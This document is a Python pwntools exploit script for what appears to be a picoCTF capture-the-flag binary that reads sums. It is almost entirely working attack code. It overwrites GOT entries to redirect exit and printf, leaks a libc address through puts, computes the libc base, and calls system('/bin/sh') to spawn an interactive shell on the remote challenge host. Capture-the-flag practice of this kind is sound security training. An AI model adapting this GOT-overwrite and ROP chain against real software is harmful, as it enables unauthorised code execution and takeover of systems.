#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./sum_ccafa40ee6a5a675341787636292bf3c84d17264", checksec=False)
libc = exe.libc

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x00000000004009BF
        c
	''')
#input()

def sent(addr, data, leak1=1, leak2=1, leak3=1, leak4=1):
    padding = data - leak1 - leak2 - leak3 - leak4 - addr
    if addr == 0 :
        payload = f"{leak1} {leak2} {leak3} {leak4} 0".encode()
    else:
        payload = f"{leak1} {leak2} {leak3} {leak4} {padding} {addr}".encode()
    sla(b"2 3 4 0\n", payload)

popRdi = 0x0000000000400a43

sent(exe.got['exit'], exe.sym['main'])
sent(exe.got['printf'], popRdi)
sent(0, exe.got['puts'], popRdi, exe.got['puts'], exe.sym['puts'], exe.sym['main'] + 4)

libc_leak = warn(u64(p.recvline().strip() + b'\0\0'), "Libc base")
libc.address = warn(libc_leak - libc.sym['puts'], "Libc base")

#padding
sent(exe.got['exit'], exe.sym['main'])
sent(0, exe.got['puts'], popRdi, next(libc.search("/bin/sh\0")), libc.sym['system'], exe.plt['exit'])

p.interactive()
